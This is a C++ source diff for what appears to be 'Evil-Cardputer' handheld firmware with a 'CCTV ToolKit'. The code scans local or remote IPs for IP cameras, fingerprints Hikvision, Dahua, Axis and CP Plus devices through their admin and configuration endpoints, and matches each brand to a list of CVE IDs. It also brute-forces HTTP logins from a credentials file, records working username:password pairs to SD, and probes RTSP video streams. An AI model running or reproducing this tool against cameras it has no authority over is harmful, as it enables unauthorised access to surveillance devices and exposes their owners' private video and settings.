+  "image/jpeg", "image/mjpeg", "video/mpeg", "video/mp4", "video/h264",
+  "application/x-mpegURL", "video/MP2T", "application/octet-stream",
+  "text/html", "application/json"
+};
+const size_t NB_CT = sizeof(camContentTypes)/sizeof(camContentTypes[0]);
+
+
+struct CVEEntry { const char *brand; const char *cve; };
+const CVEEntry cveDB[] PROGMEM = {
+  // Hikvision
+  {"hikvision","CVE-2021-36260"}, {"hikvision","CVE-2017-7921"},
+  {"hikvision","CVE-2021-31955"}, {"hikvision","CVE-2021-31956"},
+  {"hikvision","CVE-2021-31957"}, {"hikvision","CVE-2021-31958"},
+  {"hikvision","CVE-2021-31959"}, {"hikvision","CVE-2021-31960"},
+  {"hikvision","CVE-2021-31961"}, {"hikvision","CVE-2021-31962"},
+  {"hikvision","CVE-2021-31963"}, {"hikvision","CVE-2021-31964"},
+  {"hikvision","CVE-2024-29947"}, {"hikvision","CVE-2024-29948"},
+  {"hikvision","CVE-2024-29949"}, {"hikvision","CVE-2024-47485"},
+  {"hikvision","CVE-2024-47486"}, {"hikvision","CVE-2024-47487"},
+
+  // Dahua
+  {"dahua","CVE-2021-33044"}, {"dahua","CVE-2022-30563"},
+  {"dahua","CVE-2021-33045"}, {"dahua","CVE-2021-33046"},
+  {"dahua","CVE-2021-33047"}, {"dahua","CVE-2021-33048"},
+  {"dahua","CVE-2021-33049"}, {"dahua","CVE-2021-33050"},
+  {"dahua","CVE-2021-33051"}, {"dahua","CVE-2021-33052"},
+  {"dahua","CVE-2021-33053"}, {"dahua","CVE-2021-33054"},
+  {"dahua","CVE-2025-31700"}, {"dahua","CVE-2024-13130"},
+
+  // Axis
+  {"axis","CVE-2018-10660"}, {"axis","CVE-2020-29550"}, {"axis","CVE-2020-29551"},
+  {"axis","CVE-2020-29552"}, {"axis","CVE-2020-29553"}, {"axis","CVE-2020-29554"},
+  {"axis","CVE-2020-29555"}, {"axis","CVE-2020-29556"}, {"axis","CVE-2020-29557"},
+  {"axis","CVE-2020-29558"}, {"axis","CVE-2020-29559"}, {"axis","CVE-2020-29560"},
+  {"axis","CVE-2024-7696"}, {"axis","CVE-2024-6749"},
+  {"axis","CVE-2024-6831"}, {"axis","CVE-2023-21406"},
+  {"axis","CVE-2023-5800"},
+
+  // Bosch
+  {"bosch","CVE-2023-39509"}, {"bosch","CVE-2024-33618"},
+  {"bosch","CVE-2019-6957"}, {"bosch","CVE-2019-6958"},
+  {"bosch","CVE-2018-20299"},
+
+  // Samsung / Hanwha Vision
+  {"samsung","CVE-2023-5747"}, {"samsung","CVE-2023-5037"},
+  {"samsung","CVE-2023-5038"}, {"samsung","CVE-2024-41882"},
+  {"samsung","CVE-2024-41883"}, {"samsung","CVE-2024-41884"},
+  {"samsung","CVE-2024-41885"}, {"samsung","CVE-2024-41886"},
+  {"samsung","CVE-2024-41887"}, {"samsung","CVE-2023-6095"},
+  {"samsung","CVE-2023-6096"},
+
+  // Panasonic
+  {"panasonic","CVE-2020-29193"}, {"panasonic","CVE-2020-29194"},
+  {"panasonic","CVE-2022-4621"},
+
+  // Vivotek
+  {"vivotek","CVE-2024-26548"}, {"vivotek","CVE-2019-10256"},
+  {"vivotek","CVE-2019-14457"}, {"vivotek","CVE-2019-14458"},
+
+  // Sony
+  {"sony","CVE-2018-3937"}, {"sony","CVE-2018-3938"},
+
+  // CP Plus
+  {"cp plus","CVE-2023-3704"}, {"cp plus","CVE-2023-3705"},
+  {"cp plus","CVE-2024-3434"}
+};
+
+const size_t NB_CVE = sizeof(cveDB) / sizeof(cveDB[0]);
+
+/**** Mots-clés serveurs / marques pour fingerprint rapide ****/
+const char * const brandKeys_hikvision[] PROGMEM = {"hikvision","dvr","nvr"};
+const char * const brandKeys_dahua[]     PROGMEM = {"dahua","dvr","nvr"};
+const char * const brandKeys_axis[]      PROGMEM = {"axis","axis communications"};
+const char * const brandKeys_sony[]      PROGMEM = {"sony","ipela"};
+const char * const brandKeys_bosch[]     PROGMEM = {"bosch","security systems"};
+const char * const brandKeys_samsung[]   PROGMEM = {"samsung","samsung techwin"};
+const char * const brandKeys_panasonic[] PROGMEM = {"panasonic","network camera"};
+const char * const brandKeys_vivotek[]   PROGMEM = {"vivotek","network camera"};
+const char * const brandKeys_generic[]   PROGMEM = {"camera","webcam","surveillance","ip camera","network camera","dvr","nvr","recorder"};
+
+
+// Trim util
+void trimStringCCTV(String &s) {
+  s.trim();
+  // retire éventuel BOM UTF-8
+  if (s.length() >= 3 && (uint8_t)s[0]==0xEF && (uint8_t)s[1]==0xBB && (uint8_t)s[2]==0xBF) {
+    s.remove(0,3);
+  }
+}
+
+
+/* ---------- Compact UI (240x135, text size 1.5) + SD summary ---------- */
+
+struct UiCtx {
+  IPAddress ip;
+  String phase;
+  std::vector<String> lines;   // last N lines on screen
+  String report;               // full per-host summary (saved to SD)
+} _ui;
+
+static const int UI_W = 240, UI_H = 135;
+static const int UI_TEXTSIZE = 15; // ~ line height with setTextSize(1.5)
+static const int UI_HEADER_H = 3 * UI_TEXTSIZE;     // title + target + phase
+static const int UI_CONTENT_Y = UI_HEADER_H + 2;    // content area start
+static const int UI_CONTENT_H = UI_H - UI_HEADER_H;
+
+int uiMaxLines() { return max(1, UI_CONTENT_H / UI_TEXTSIZE); }
+bool g_scanFromSD = false;
+void uiPrintAt(int16_t x, int16_t y, const String& s, uint16_t color) {
+  M5.Display.setTextColor(color, TFT_BLACK);
+  M5.Display.setCursor(x, y);
+  M5.Display.print(s);
+}
+
+void uiDrawHeader() {
+  M5.Display.fillRect(0, 0, UI_W, UI_HEADER_H, TFT_BLACK);
+  M5.Display.setTextSize(1.5);
+  uiPrintAt(0, 0, "CCTV ToolKit", menuTextFocusedColor);
+  uiPrintAt(0, UI_TEXTSIZE, "Target: " + _ui.ip.toString(), menuTextUnFocusedColor);
+  uiPrintAt(0, UI_TEXTSIZE * 2, "Phase: " + _ui.phase, menuTextFocusedColor);
+}
+
+void uiDrawContent() {
+  M5.Display.fillRect(0, UI_CONTENT_Y, UI_W, UI_CONTENT_H, TFT_BLACK);
+  M5.Display.setTextSize(1);
+  int linesToShow = min((int)_ui.lines.size(), uiMaxLines());
+  int start = (int)_ui.lines.size() - linesToShow;
+  for (int i = 0; i < linesToShow; ++i) {
+    uiPrintAt(0, UI_CONTENT_Y + i * UI_TEXTSIZE, _ui.lines[start + i], menuTextUnFocusedColor);
+  }
+}
+
+void uiRefresh(int pct = -1, const String& label = "") {
+  uiDrawHeader();
+  uiDrawContent();
+  M5.Display.display();
+}
+
+void uiBeginHost(const IPAddress& ip) {
+  _ui.ip = ip;
+  _ui.phase = "Starting…";
+  _ui.lines.clear();
+  _ui.report = "";
+}
+
+void uiPhase(const String& phase) {
+  _ui.phase = phase;
+  uiRefresh();
+}
+
+void uiReportOnly(const String& line) {
+  _ui.report += line + "\n";
+}
+
+void uiAppend(const String& line, bool alsoInReport = true) {
+  if ((int)_ui.lines.size() >= uiMaxLines()) _ui.lines.erase(_ui.lines.begin());
+  _ui.lines.push_back(line);
+  if (alsoInReport) _ui.report += line + "\n";
+  uiDrawContent();
+  M5.Display.display();
+}
+
+void uiEndHostAndSave() {
+  bool saved = false;
+  #ifdef SD_FAT_VERSION   // SdFat or standard SD both define SD
+  #endif
+  File f = SD.open("/evil/CCTV/CCTV_scan.txt", FILE_APPEND);
+  if (!f) f = SD.open("/evil/CCTV/CCTV_scan.txt", FILE_WRITE);
+  if (f) {
+    f.println("----------------------------------------------------------------");
+    f.printf("Target: %s\n", _ui.ip.toString().c_str());
+    f.print(_ui.report);
+    f.println();
+    f.close();
+    saved = true;
+  }
+  uiRefresh(100, "Done");
+}
+
+int countCVEsForBrand(const String& brand) {
+  int n = 0;
+  for (size_t i = 0; i < NB_CVE; ++i) {
+    CVEEntry e; memcpy_P(&e, cveDB + i, sizeof(CVEEntry));
+    if (brand.equalsIgnoreCase(e.brand)) ++n;
+  }
+  return n;
+}
+
+/* ---------- Helpers UI & IP ---------- */
+
+int chooseScanModeMenu() {
+  // 0 = Local (LAN), 1 = Single IP (WAN), 2 = From file (SD),
+  // 3 = MJPEG Live Viewer, -1 = Cancel
+  int index = 0;
+  const int itemCount = 5 ;// ← augmenté
+const char* items[itemCount] = {
+    "Scan Local (LAN)",
+    "Scan IP unique (WAN)",
+    "Scan from file (SD)",
+    "MJPEG Live Viewer (SD)",
+    "Spycam Detector (WiFi)"
+  };
+
+  enterDebounce();
+  bool need = true;
+
+  while (true) {
+    M5.update();
+    M5Cardputer.update();
+
+    if (need) {
+      M5.Display.clear();
+      M5.Display.setTextSize(1.5);
+      M5.Display.setCursor(0, 0);
+      M5.Display.setTextColor(menuTextFocusedColor, menuBackgroundColor);
+      M5.Display.println("CCTV ToolKit - Mode selection");
+      M5.Display.println("-----------------------------");
+      for (int i = 0; i < itemCount; ++i) {
+        if (i == index) {
+          M5.Display.setTextColor(menuTextFocusedColor);
+          M5.Display.fillRect(0, 30 + i*16, M5.Display.width(), 16, menuSelectedBackgroundColor);
+        } else {
+          M5.Display.setTextColor(menuTextUnFocusedColor, TFT_BLACK);
+        }
+        M5.Display.setCursor(6, 30 + i*16);
+        M5.Display.println(items[i]);
+      }
+      M5.Display.setTextColor(menuTextUnFocusedColor, TFT_BLACK);
+      M5.Display.setCursor(0, M5.Display.height()-10);
+      M5.Display.println(" ^/ v / ENTER / BACKSPACE");
+      M5.Display.display();
+      need = false;
+    }
+
+    if (M5Cardputer.Keyboard.isKeyPressed(';')) { index = (index - 1 + itemCount) % itemCount; need = true; delay(150); } // haut
+    if (M5Cardputer.Keyboard.isKeyPressed('.')) { index = (index + 1) % itemCount;           need = true; delay(150); } // bas
+
+    if (M5Cardputer.Keyboard.isKeyPressed(KEY_ENTER))      { return index; }
+    if (M5Cardputer.Keyboard.isKeyPressed(KEY_BACKSPACE))  { return -1; }
+    delay(10);
+  }
+}
+
+
+
+bool promptIPv4(IPAddress& out) {
+  M5.Display.clear();
+  M5.Display.setTextColor(menuTextUnFocusedColor, TFT_BLACK);
+  M5.Display.setTextSize(1.5);
+  M5.Display.setCursor(0, 10);
+  M5.Display.println("Entrer IP (ex: 8.8.8.8)");
+  M5.Display.display();
+
+  String s = getUserInput();
+  if (!out.fromString(s)) {
+    M5.Display.clear();
+    M5.Display.setCursor(0, 10);
+    M5.Display.println("IP Adress invalid.");
+    M5.Display.display();
+    delay(1200);
+    return false;
+  }
+  return true;
+}
+
+bool headerContainsAny(const String& hdr, const char * const * keys, size_t n) {
+  String h = hdr; h.toLowerCase();
+  for (size_t i = 0; i < n; ++i) {
+    const char* kw = reinterpret_cast<const char*>(pgm_read_ptr(&keys[i]));
+    if (h.indexOf(kw) >= 0) return true;
+  }
+  return false;
+}
+
+/* Requêtes GET avec headers + lecture corps limitée à 512 B */
+bool httpRequest(IPAddress ip, uint16_t port, const char* path, String& respHdr, String& first512) {
+  HTTPClient http;
+  WiFiClient cli;
+  WiFiClientSecure tls;
+  cli.setTimeout(500); // timeout lecture/écriture
+  tls.setTimeout(500); // idem pour TLS
+  
+  String fullUrl = String(protoFromPort(port)) + "://" + ip.toString() + ":" + port + path;
+  httpBeginAuto(http, cli, tls, fullUrl);
+
+  int code = http.GET();
+  if (code < 0) { http.end(); return false; }
+
+  respHdr  = http.header("Server");
+
+  first512 = "";
+  Stream* s = http.getStreamPtr();
+  uint32_t t0 = millis();
+  while (s->available() == 0 && millis() - t0 < 300) delay(10);
+  while (s->available() && first512.length() < 512) {
+    char c = (char)s->read();
+    first512 += c;
+  }
+
+  http.end();
+  return true;
+}
+
+void local_scan_CCTV() {
+  if (WiFi.localIP().toString() == "0.0.0.0") {
+    waitAndReturnToMenu("Not connected...");
+    return;
+  }
+
+  enterDebounce();
+  hostslistCCTV.clear();
+
+  M5.Display.setTextColor(menuTextUnFocusedColor, TFT_BLACK);
+  M5.Display.setTextSize(1.5);
+
+  IPAddress subnetMask = WiFi.subnetMask();
+  IPAddress network = WiFi.localIP(); network[3] = 0;
+
+  M5.Display.clear();
+  int numHosts = 254 - subnetMask[3];
+  M5.Display.setCursor(0, M5.Display.height() / 2);
+  M5.Display.println("Probing " + String(numHosts) + " hosts with ARP");
+  M5.Display.println("       please wait...");
+
+  char base_ip[16];
+  sprintf(base_ip, "%d.%d.%d.", network[0], network[1], network[2]);
+
+  send_arp(base_ip, hostslistCCTV);
+  read_arp_table(base_ip, 1, numHosts, hostslistCCTV);
+
+  bool foundHosts = !hostslistCCTV.empty();
+
+  for (int i = 1; i <= numHosts; i++) {
+    M5Cardputer.update();
+    if (M5Cardputer.Keyboard.isKeyPressed(KEY_ENTER)) break;
+    IPAddress currentIP = network; currentIP[3] = i;
+    if (arpRequest(currentIP)) {
+      hostslistCCTV.push_back(currentIP);
+      foundHosts = true;
+      logScanResult("Host : " + currentIP.toString());
+    }
+  }
+
+  if (!foundHosts) {
+    M5.Display.println("No hosts found.");
+    delay(1500);
+    waitAndReturnToMenu("No hosts found.");
+    return;
+  }
+}
+
+/* Test rapide d’un port */
+bool isPortOpen(IPAddress ip, uint16_t port, uint32_t tout = 250) {
+  WiFiClient client;
+  bool ok = connectWithTimeout(client, ip, port, tout);
+  if (ok) client.stop();
+  return ok;
+}
+
+std::vector<uint16_t> scanCameraPorts(IPAddress ip) {
+  uiPhase("Port scan");
+  std::vector<uint16_t> open;
+  String openList = "";
+
+  for (size_t i = 0; i < NB_CAMERA_PORTS; ++i) {
+    uint16_t p = pgm_read_word(&cameraPorts[i]);
+    if (isPortOpen(ip, p)) {
+      open.push_back(p);
+      if (openList.length()) openList += ",";
+      openList += String(p);
+      Serial.printf("[OPEN] %s:%u\n", ip.toString().c_str(), p);
+      logScanResult(ip.toString() + ":" + String(p));
+      uiAppend("Open port: " + String(p), false);
+    }
+    M5Cardputer.update();
+    if (M5Cardputer.Keyboard.isKeyPressed(KEY_ENTER) || M5Cardputer.Keyboard.isKeyPressed(KEY_BACKSPACE)) break;
+    delay(6);
+  }
+
+  if (open.empty()) {
+    uiAppend("Open ports: none");
+  } else {
+    uiAppend("Ports: " + openList);
+  }
+  return open;
+}
+
+
+void findLoginPages(IPAddress ip, const std::vector<uint16_t>& ports) {
+  uiPhase("Finding login pages");
+  int found = 0;
+
+  for (uint16_t p : ports) {
+    if (!isHttpLikePort(p)) continue;
+
+    for (size_t k = 0; k < NB_CAMERA_PATHS; ++k) {
+      const char* path = reinterpret_cast<const char*>(pgm_read_ptr(&cameraPaths[k]));
+      HTTPClient http; WiFiClient cli; WiFiClientSecure tls;
+      String fullUrl = String(protoFromPort(p)) + "://" + ip.toString() + ":" + String(p) + path;
+
+      // → AFFICHAGE EN SERIAL DE L'URL TESTÉE
+      Serial.printf("[TEST] %s\n", fullUrl.c_str());
+
+      httpBeginAuto(http, cli, tls, fullUrl);
+      int code = http.sendRequest("HEAD");
+      http.end();
+
+      if (code == 200) {
+        Serial.printf("[LOGIN] %s (HTTP %d)\n", fullUrl.c_str(), code);
+        logScanResult("[LOGIN] " + fullUrl);
+
+        uiAppend(fullUrl + " (HTTP:" + code + ")", true);
+        ++found;
+      }
+
+      M5Cardputer.update();
+      if (M5Cardputer.Keyboard.isKeyPressed(KEY_ENTER) ||
+          M5Cardputer.Keyboard.isKeyPressed(KEY_BACKSPACE)) {
+        uiAppend("Login pages: " + String(found));
+        return;
+      }
+    }
+  }
+
+  uiAppend("Login pages: " + String(found));
+}
+
+
+
+void lookupCVEs(const String& brand) {
+  for (size_t i = 0; i < NB_CVE; ++i) {
+    CVEEntry e;
+    memcpy_P(&e, cveDB + i, sizeof(CVEEntry));
+    if (brand.equalsIgnoreCase(e.brand)) {
+      Serial.printf("   → %s\n", e.cve);
+      logScanResult("CVE " + String(e.cve));
+    }
+  }
+}
+
+void printCveLinks(const String& brand) {
+  Serial.printf("[🛡] Known CVEs for %s:\n", brand.c_str());
+  for (size_t i = 0; i < NB_CVE; ++i) {
+    CVEEntry e; memcpy_P(&e, cveDB + i, sizeof(CVEEntry));
+    if (brand.equalsIgnoreCase(e.brand)) {
+      Serial.printf("   https://nvd.nist.gov/vuln/detail/%s\n", e.cve);
+    }
+  }
+}
+
+#define MAX_USER_LEN 15
+#define MAX_PASS_LEN 32
+
+// fichier des identifiants (SD)
+static const char* CREDS_FILE = "/evil/CCTV/CCTV_credentials.txt";
+
+struct Credential {
+  char user[MAX_USER_LEN];
+  char pass[MAX_PASS_LEN];
+};
+
+void testDefaultCreds(IPAddress ip, const std::vector<uint16_t>& ports) {
+  uiPhase("Default passwords");
+
+  if (!SD.exists(CREDS_FILE)) {
+    Serial.println("[×] credentials.txt missing.");
+    uiAppend("[x] credentials.txt missing.");
+    return;
+  }
+
+  File f = SD.open(CREDS_FILE, FILE_READ);
+  if (!f) {
+    uiAppend("[x] Cannot open credentials.txt");
+    return;
+  }
+
+  static const char* endpoints[] = { "/", "/login", "/admin", "/cgi-bin/login", "/index.html" };
+  const size_t N_ENDPOINTS = sizeof(endpoints) / sizeof(endpoints[0]);
+
+  // tableau de cache : needsAuth[portIndex][pathIndex]
+  bool skipPath[16][N_ENDPOINTS]; // max 16 ports
+  memset(skipPath, 0, sizeof(skipPath));
+
+  auto portIndex = [&](uint16_t port) -> int {
+    for (size_t i = 0; i < ports.size(); ++i) if (ports[i] == port) return i;
+    return -1;
+  };
+
+  char line[160];
+  bool success = false;
+  Serial.println("[INFO] Starting credentials test...");
+
+  // --- Phase 1 : préflight des chemins (un seul passage)
+  for (uint16_t port : ports) {
+    int pIdx = portIndex(port);
+    if (pIdx < 0 || pIdx >= 16 || !isHttpLikePort(port)) continue;
+
+    for (size_t i = 0; i < N_ENDPOINTS; ++i) {
+      String url = String(protoFromPort(port)) + "://" + ip.toString() + ":" + String(port) + endpoints[i];
+
+      HTTPClient http0; WiFiClient cli0; WiFiClientSecure tls0;
+      const char* hdrKeys[] = {"WWW-Authenticate"};
+      http0.collectHeaders(hdrKeys, 1);
+      httpBeginAuto(http0, cli0, tls0, url);
+      int code0 = http0.GET();
+      String www = http0.header("WWW-Authenticate");
+      http0.end();
+
+      bool needsAuth = (code0 == 401 || code0 == 403 || www.length() > 0);
+      if (!needsAuth) {
+        skipPath[pIdx][i] = true;
+        Serial.printf("[SKIP] No auth needed at %s\n", url.c_str());
+      }
+    }
+  }
+
+  // --- Phase 2 : test des credentials uniquement sur les paths protégés
+  while (f.available()) {
+    size_t len = f.readBytesUntil('\n', line, sizeof(line) - 1);
+    line[len] = '\0';
+
+    char* p = strchr(line, '\r'); if (p) *p = '\0';
+    p = strchr(line, '#');        if (p) *p = '\0';
+
+    char* u = line; while (*u && isspace((uint8_t)*u)) u++;
+    char* e = u + strlen(u); while (e > u && isspace((uint8_t)e[-1])) e--;
+    *e = '\0';
+    if (!*u) continue;
+
+    char* sep = strpbrk(u, ":;,\t ");
+    if (!sep) continue;
+    *sep = '\0';
+    char* pw = sep + 1; while (*pw && isspace((uint8_t)*pw)) pw++;
+
+    Credential c;
+    strncpy(c.user, u, MAX_USER_LEN - 1); c.user[MAX_USER_LEN - 1] = '\0';
+    strncpy(c.pass, pw, MAX_PASS_LEN - 1); c.pass[MAX_PASS_LEN - 1] = '\0';
+
+    for (uint16_t port : ports) {
+      int pIdx = portIndex(port);
+      if (pIdx < 0 || pIdx >= 16 || !isHttpLikePort(port)) continue;
+
+      for (size_t i = 0; i < N_ENDPOINTS; ++i) {
+        if (skipPath[pIdx][i]) continue;
+
+        String url = String(protoFromPort(port)) + "://" + ip.toString() + ":" + String(port) + endpoints[i];
+        Serial.printf("[TEST] Trying %s with %s:%s\n", url.c_str(), c.user, c.pass);
+
+        HTTPClient http; WiFiClient cli; WiFiClientSecure tls;
+        httpBeginAuto(http, cli, tls, url);
+        http.setAuthorization(c.user, c.pass);
+        int code = http.GET();
+        http.end();
+
+        if (code == 200) {
+          Serial.printf("[🔥] %s -> %s:%s OK!\n", url.c_str(), c.user, c.pass);
+          logScanResult("[PASS] " + url + " " + String(c.user) + ":" + String(c.pass));
+          uiAppend("Default creds: FOUND");
+          uiReportOnly(url + "  " + String(c.user) + ":" + String(c.pass));
+          success = true;
+          f.close();
+          return;
+        }
+
+        M5Cardputer.update();
+        if (M5Cardputer.Keyboard.isKeyPressed(KEY_ENTER) || M5Cardputer.Keyboard.isKeyPressed(KEY_BACKSPACE)) {
+          uiAppend("Default creds: aborted");
+          f.close();
+          return;
+        }
+      }
+    }
+  }
+
+  f.close();
+  if (!success) {
+    Serial.println("[×] No password found...");
+    uiAppend("[x] No password found...");
+  }
+}
+
+
+
+
+
+/* Fingerprint par marque */
+bool fingerprintHikvision(IPAddress ip, uint16_t p) {
+  HTTPClient http; WiFiClient cli; WiFiClientSecure tls;
+  String proto = protoFromPort(p);
+  String url1 = proto + "://" + ip.toString() + ":" + String(p) + "/System/configurationFile";
+  String url2 = proto + "://" + ip.toString() + ":" + String(p) + "/ISAPI/System/deviceInfo";
+
+  // Tentative 1: deviceInfo
+  httpBeginAuto(http, cli, tls, url2);
+  int code = http.GET();
+  if (code == 200) {
+    String xml = http.getString();
+    int pos = xml.indexOf("<model>"); if (pos >= 0) {
+      String model = xml.substring(pos + 7, xml.indexOf("</model>", pos));
+      Serial.printf("   Model: %s\n", model.c_str());
+      logScanResult("Model " + model);
+    }
+    http.end();
+    printCveLinks("hikvision");
+    return true;
+  }
+  http.end();
+
+  // Tentative 2: configurationFile (peut nécessiter auth)
+  httpBeginAuto(http, cli, tls, url1);
+  code = http.GET();
+  if (code == 200) {
+    Serial.printf("   OK: %s\n", url1.c_str());
+    http.end();
+    printCveLinks("hikvision");
+    return true;
+  }
+  http.end();
+  return false;
+}
+
+bool fingerprintDahua(IPAddress ip, uint16_t p) {
+  HTTPClient http; WiFiClient cli; WiFiClientSecure tls;
+  String url = String(protoFromPort(p)) + "://" + ip.toString() + ":" + String(p) + "/cgi-bin/magicBox.cgi?action=getSystemInfo";
+  httpBeginAuto(http, cli, tls, url);
+  int code = http.GET();
+  if (code == 200) {
+    Serial.printf("   OK: %s\n%s\n", url.c_str(), http.getString().c_str());
+    http.end(); printCveLinks("dahua"); return true;
+  }
+  http.end(); return false;
+}
+
+bool fingerprintAxis(IPAddress ip, uint16_t p) {
+  HTTPClient http; WiFiClient cli; WiFiClientSecure tls;
+  String url = String(protoFromPort(p)) + "://" + ip.toString() + ":" + String(p) + "/axis-cgi/admin/param.cgi?action=list";
+  httpBeginAuto(http, cli, tls, url);
+  int code = http.GET();
+  if (code == 200) {
+    String txt = http.getString();
+    Serial.printf("   OK: %s\n", url.c_str());
+
+    // Parcours manuel des lignes (String n’a pas split)
+    int start = 0;
+    while (start <= (int)txt.length()) {
+      int nl = txt.indexOf('\n', start);
+      String line = (nl < 0) ? txt.substring(start) : txt.substring(start, nl);
+      // Trim léger
+      while (line.endsWith("\r")) line.remove(line.length()-1);
+
+      if (line.indexOf("root.Brand")     >= 0 ||
+          line.indexOf("root.Model")     >= 0 ||
+          line.indexOf("root.Firmware")  >= 0) {
+        Serial.printf("   %s\n", line.c_str());
+      }
+
+      if (nl < 0) break;
+      start = nl + 1;
+      M5Cardputer.update();
+      if (M5Cardputer.Keyboard.isKeyPressed(KEY_BACKSPACE)) { http.end(); return true; }
+    }
+
+    http.end();
+    printCveLinks("axis");
+    return true;
+  }
+  http.end();
+  return false;
+}
+
+bool fingerprintCPPlus(IPAddress ip, uint16_t p) {
+  const char* eps[] = { "/", "/index.html", "/login", "/admin", "/cgi-bin", "/api", "/config" };
+  for (const char* ep : eps) {
+    HTTPClient http; WiFiClient cli; WiFiClientSecure tls;
+    String url = String(protoFromPort(p)) + "://" + ip.toString() + ":" + String(p) + ep;
+    httpBeginAuto(http, cli, tls, url);
+    int code = http.GET();
+    if (code == 200) {
+      String content = http.getString(); String low = content; low.toLowerCase();
+      Serial.printf("   OK: %s\n", url.c_str());
+      if (low.indexOf("uvr-0401e1")>=0 || low.indexOf("uvr0401e1")>=0) Serial.println("   Model: CP-UVR-0401E1-IC2");
+      if (low.indexOf("cp plus")>=0 || low.indexOf("cpplus")>=0) Serial.println("   Brand: CP Plus");
+      if (low.indexOf("dvr")>=0) Serial.println("   Device: DVR");
+      http.end(); printCveLinks("cp plus"); return true;
+    }
+    http.end();
+    M5Cardputer.update(); if (M5Cardputer.Keyboard.isKeyPressed(KEY_BACKSPACE)) return false;
+  }
+  return false;
+}
+
+/* Fingerprint générique (essaie plusieurs endpoints usuels) */
+bool fingerprintGeneric(IPAddress ip, uint16_t p) {
+  const char* eps[] = {
+    "/System/configurationFile", "/ISAPI/System/deviceInfo",
+    "/cgi-bin/magicBox.cgi?action=getSystemInfo", "/axis-cgi/admin/param.cgi?action=list",
+    "/", "/index.html", "/login", "/admin", "/cgi-bin", "/api", "/config"
+  };
+  for (const char* ep : eps) {
+    HTTPClient http; WiFiClient cli; WiFiClientSecure tls;
+    String url = String(protoFromPort(p)) + "://" + ip.toString() + ":" + String(p) + ep;
+
+    // (Optionnel) collecter quelques entêtes
+    // const char* hdrKeys[] = {"Server","Content-Type","WWW-Authenticate"};
+    // http.collectHeaders(hdrKeys, 3);
+
+    httpBeginAuto(http, cli, tls, url);
+    int code = http.GET();
+    if (code == 200) {
+      String txt = http.getString();
+      Serial.printf("   OK: %s\n", url.c_str());
+
+      String t = txt;
+      // t += " "; t += http.header("Server");
+      // t += " "; t += http.header("Content-Type");
+      // t += " "; t += http.header("WWW-Authenticate");
+      t.toLowerCase();
+
+      if (t.indexOf("hikvision")>=0) { http.end(); printCveLinks("hikvision"); return true; }
+      if (t.indexOf("dahua")>=0)     { http.end(); printCveLinks("dahua");     return true; }
+      if (t.indexOf("axis")>=0)      { http.end(); printCveLinks("axis");      return true; }
+      if (t.indexOf("cp plus")>=0 || t.indexOf("cp-plus")>=0 || t.indexOf("cpplus")>=0 || t.indexOf("cp_plus")>=0) {
+        http.end(); printCveLinks("cp plus"); return true;
+      }
+      http.end();
+      return true; // endpoint répond quand même, utile pour logs
+    }
+    http.end();
+    M5Cardputer.update(); if (M5Cardputer.Keyboard.isKeyPressed(KEY_BACKSPACE)) return false;
+  }
+  return false;
+}
+
+/* Fingerprint principal (appelle par marque) */
+void fingerprintCamera(IPAddress ip, const std::vector<uint16_t>& ports, const String& brand) {
+  uiPhase("Fingerprint & CVEs");
+  if (brand.length()) uiAppend("Brand: " + brand);
+  int cves = countCVEsForBrand(brand);
+  if (cves > 0) uiAppend("Known CVEs: " + String(cves), false);
+
+  Serial.printf("[FP] %s (%s)\n", ip.toString().c_str(), brand.c_str());
+  lookupCVEs(brand);
+
+  for (uint16_t p : ports) {
+    bool done = false;
+    if (brand == "Hikvision")      done = fingerprintHikvision(ip, p);
+    else if (brand == "Dahua")     done = fingerprintDahua(ip, p);
+    else if (brand == "Axis")      done = fingerprintAxis(ip, p);
+    else if (brand == "CP Plus")   done = fingerprintCPPlus(ip, p);
+    else                           done = fingerprintGeneric(ip, p);
+    if (done) break;
+    M5Cardputer.update(); if (M5Cardputer.Keyboard.isKeyPressed(KEY_BACKSPACE)) break;
+  }
+}
+
+/* ---------- RTSP helpers robustes ---------- */
+
+bool readLineWithTimeout(WiFiClient& c, String& line, uint32_t timeout_ms = 1500) {
+  uint32_t t0 = millis();
+  while (!c.available() && (millis() - t0) < timeout_ms) { delay(10); }
+  if (!c.available()) return false;
+  line = c.readStringUntil('\n');
+  line.trim();
+  return true;
+}
+
+String readBodyWithTimeout(WiFiClient& c, size_t max_bytes = 2048, uint32_t timeout_ms = 800) {
+  String out;
+  uint32_t t0 = millis();
+  while ((millis() - t0) < timeout_ms && out.length() < (int)max_bytes) {
+    while (c.available() && out.length() < (int)max_bytes) {
+      out += (char)c.read();
+    }
+    delay(4);
+  }
+  return out;
+}
+
+/* Détecte la présence d'un service RTSP via OPTIONS * (RFC 2326) */
+bool rtspServicePresent(IPAddress ip, uint16_t port, String* publicHeaderOut = nullptr) {
+  WiFiClient client;
+  if (!client.connect(ip, port, 1000)) return false;
+
+  client.printf(
+    "OPTIONS * RTSP/1.0\r\n"
+    "CSeq: 1\r\n"
+    "User-Agent: Evil-Cardputer\r\n"
+    "\r\n"
+  );
+
+  String status;
+  if (!readLineWithTimeout(client, status)) { client.stop(); return false; }
+  bool ok = status.startsWith("RTSP/1.0 200");
+
+  String line, publicLine;
+  while (readLineWithTimeout(client, line)) {
+    if (line.length() == 0) break;
+    if (line.startsWith("Public:")) publicLine = line;
+  }
+  client.stop();
+
+  if (ok && publicHeaderOut) *publicHeaderOut = publicLine;
+  return ok;
+}
+
+/* DESCRIBE + vraie validation SDP (header + corps) */
+bool rtspDescribe(IPAddress ip, uint16_t port, const char* path, int& codeOut, bool& sdpOut) {
+  sdpOut = false; codeOut = -1;
+
+  WiFiClient client;
+  if (!client.connect(ip, port, 1000)) return false;
+
+  String url = "rtsp://" + ip.toString() + ":" + String(port) + String(path);
+  client.printf(
+    "DESCRIBE %s RTSP/1.0\r\n"
+    "CSeq: 2\r\n"
+    "User-Agent: Rvil-Cardputer\r\n"
+    "Accept: application/sdp\r\n"
+    "\r\n", url.c_str()
+  );
+
+  String status;
+  if (!readLineWithTimeout(client, status)) { client.stop(); return false; }
+
+  if (status.startsWith("RTSP/1.0 ")) {
+    int sp = status.indexOf(' ');
+    int sp2 = status.indexOf(' ', sp + 1);
+    if (sp >= 0 && sp2 > sp) codeOut = status.substring(sp + 1, sp2).toInt();
+  }
+
+  // Lire headers
+  String line, ct; int cl = -1;
+  while (readLineWithTimeout(client, line)) {
+    if (line.length() == 0) break;
+    String low = line; low.toLowerCase();
+    if (low.startsWith("content-type:")) ct = low;
+    if (low.startsWith("content-length:")) cl = line.substring(line.indexOf(':')+1).toInt();
+  }
+
+  // Lire un bout du corps et valider grammaire SDP
